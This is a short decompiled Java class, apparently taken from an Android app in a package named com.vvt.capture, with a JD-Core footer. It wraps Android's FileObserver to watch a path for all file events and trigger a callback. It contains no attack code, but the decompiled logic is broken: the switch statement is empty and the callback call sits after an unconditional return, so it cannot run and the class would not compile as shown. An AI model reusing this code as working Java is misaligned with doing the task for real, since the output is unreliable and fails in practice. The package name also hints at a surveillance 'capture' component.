package com.vvt.capture.d.a.a;

import android.os.FileObserver;

public class b
  extends FileObserver
{
  private a a;
  
  public b(String paramString, a parama)
  {
    super(paramString, 4095);
    this.a = parama;
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    switch (paramInt)
    {
    }
    for (;;)
    {
      return;
      a locala = this.a;
      locala.a();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/d/a/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */